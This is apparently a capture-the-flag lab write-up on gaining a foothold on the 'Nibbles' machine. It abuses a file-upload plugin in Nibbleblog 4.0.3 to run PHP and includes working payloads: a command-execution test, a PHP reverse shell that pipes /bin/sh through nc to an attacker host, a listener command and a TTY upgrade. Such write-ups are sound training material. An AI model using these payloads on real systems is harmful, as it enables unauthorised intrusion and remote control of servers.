# Nibbles — Initial Foothold

**Goal:** Turn admin portal access into code execution and a reverse shell on the webserver.

---

## Quick summary
- Logged into the Nibbleblog admin portal and enumerated pages (Publish, Comments, Manage, Settings, Themes, Plugins).
- `Plugins → My image` allowed file uploads; attempted to upload a PHP file instead of an image.
- Upload produced image-related warnings but file appeared to exist under the plugins directory.
- Located uploaded file at: `/nibbleblog/content/private/plugins/my_image/image.php`.
- Executed uploaded PHP via `curl` and confirmed remote code execution as `nibbler`.
- Replaced PHP with a reverse-shell one-liner, started an `nc` listener, and got a reverse shell.
- Upgraded the shell to a proper TTY with `python3`.
- Found `user.txt` and `personal.zip` in `/home/nibbler`.

---

## Notes / Findings

### Admin portal pages inspected
- **Publish** — create post/page/video/quote (potential entry points).
- **Comments** — no published comments.
- **Manage** — manage posts/pages/categories.
- **Settings** — shows vulnerable version `4.0.3`.
- **Themes** — installable themes.
- **Plugins** — can configure/install/uninstall; **My image** plugin allows file upload (promising).

### Upload test
Tried uploading a PHP test file:
```php
<?php system('id'); ?>
```

Upload caused PHP/Image warnings (resize class expected image resource), but upload appeared to succeed.

### Located uploaded file
Path discovered by checking directory enumeration results:
```
http://<host>/nibbleblog/content/private/plugins/my_image/
```
Files observed: `db.xml`, `image.php` (recently modified).

### Confirm remote code execution
Command:
```bash
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```
Output:
```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

User context: `nibbler`.

---

## Obtaining a reverse shell

### Reverse shell payload used (PHP wrapper)
Replace `<ATTACKER_IP>` and `<PORT>` accordingly.

PHP file contents used:
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f"); ?>
```

Example used in lab:
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

### Listener (attacker)
```bash
nc -lvnp 9443
# listening on [any] 9443 ...
```

Trigger the PHP by visiting or curling:
```
http://<host>/nibbleblog/content/private/plugins/my_image/image.php
```

Listener shows connection:
```
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

---

## Upgrading the shell to an interactive TTY
`python` (v2) missing; `python3` present.

Use:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

(Other upgrade methods exist — see reverse-shell cheat sheets / shell upgrade guides.)

---

## Post-foothold enumeration
From `/home/nibbler`:
```bash
ls
# personal.zip  user.txt
```

`user.txt` found (user flag). `personal.zip` present for further enumeration.

---

## Useful references
- Reverse shell cheat sheets: `PayloadsAllTheThings` and `HighOn.Coffee` (great consolidated reverse-shell examples / formats).

---

## Suggested next steps
- Download and inspect `personal.zip` (possible credentials, further artifacts).
- Enumerate `/home/nibbler` files and permissions.
- Perform local enumeration for SUID binaries, weak sudo rules, and scheduled tasks.
- Search for credentials/config files, SSH keys, or configuration files with secrets.
- Capture `user.txt` content and continue privilege-escalation enumeration.

---

## Commands collected (copyable)
```bash
# check uploaded php
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

# start listener (attacker)
nc -lvnp 9443

# upgrade shell to tty (on target)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# list home
ls /home/nibbler
```
